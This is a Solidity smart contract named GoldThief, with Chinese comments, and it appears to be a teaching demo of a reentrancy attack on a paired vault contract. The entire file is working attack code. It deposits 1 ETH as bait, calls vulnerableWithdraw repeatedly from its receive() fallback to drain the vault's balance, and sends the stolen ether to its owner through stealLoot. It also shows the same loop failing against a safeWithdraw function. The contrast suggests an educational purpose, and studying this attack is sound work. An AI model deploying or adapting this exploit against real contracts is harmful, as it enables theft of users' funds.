// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

//接口，让攻击者知道之前合约里有什么函数
interface IVault {
function deposit() external payable;
function vulnerableWithdraw() external;
function safeWithdraw() external;
}

//这些变量储存攻击者的“记忆”
contract GoldThief {
IVault public targetVault;//知道金库的地址
address public owner;//存储部署攻击合约的地址
uint public attackCount;//记录我们重入循环的次数，因为如果不限制，攻击可能会无限循环（或直到 gas 用尽）
bool public attackingSafe;

constructor(address _vaultAddress) {
    targetVault = IVault(_vaultAddress);//传入想要攻击的合约地址
    owner = msg.sender;
}

//攻击有漏洞的取款函数
function attackVulnerable() external payable {
    require(msg.sender == owner, "Only owner");//只有部署者（抢劫者）才能发动攻击
    require(msg.value >= 1 ether, "Need at least 1 ETH to attack");//攻击者必须在调用该函数时发送至少 1 ETH——这是初始的“诱饵”存款，让金库以为这是正常用户行为

    attackingSafe = false;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();//像普通用户一样将钱存进金库合约里
    targetVault.vulnerableWithdraw();
}

//攻击安全的取款函数
function attackSafe() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH");

    attackingSafe = true;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.safeWithdraw();
}

//重入攻击关键，当合约接收到 ETH 时，Solidity 会自动触发它
receive() external payable {
    attackCount++;//统计攻击循环次数

    if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        targetVault.vulnerableWithdraw();//让合约再次调用withdraw给抢劫者账户里转钱
    }

    if (attackingSafe) {
        targetVault.safeWithdraw(); //这会失败
    }
}

//将钱从合约中转出
function stealLoot() external {
    require(msg.sender == owner, "Only owner");
    payable(owner).transfer(address(this).balance);
}

//返回 GoldThief 合约当前持有的 ETH 余额。用来查看从金库中抽走了多少资金
function getBalance() external view returns (uint256) {
    return address(this).balance;
}
}